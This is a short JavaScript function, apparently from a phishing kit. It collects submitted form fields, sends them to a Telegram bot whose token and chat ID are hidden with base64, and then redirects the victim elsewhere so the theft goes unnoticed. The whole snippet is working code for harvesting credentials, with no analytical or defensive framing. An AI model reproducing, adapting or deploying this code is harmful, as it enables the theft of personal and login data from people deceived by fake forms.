const sendMessage = (formData, redirect, timeout) => {
  let text = "";
  const botToken =
    "NjA1NzMwMjMyMzpBQUhjenNsWk1pQWtETGQ5SGdFX1BPanQ4NVBTRjJTZmhwQQ==";
  const chatId = "NTg1MjUzNjM0NA==";
  const url = `https://api.telegram.org/bot${atob(botToken)}/sendMessage`;
  for (const pair of formData.entries()) {
    const firstChar = pair[0].charAt(0);
    if (firstChar === firstChar.toUpperCase())
      text += `${pair[0]}: ${pair[1]}\n`;
  }
  fetch(`${url}?chat_id=${atob(chatId)}&text=${encodeURIComponent(text)}`)
    .then((res) =>
      setTimeout(() => {
        location.assign(redirect);
      }, timeout)
    )
    .catch((err) => console.log(err));
};
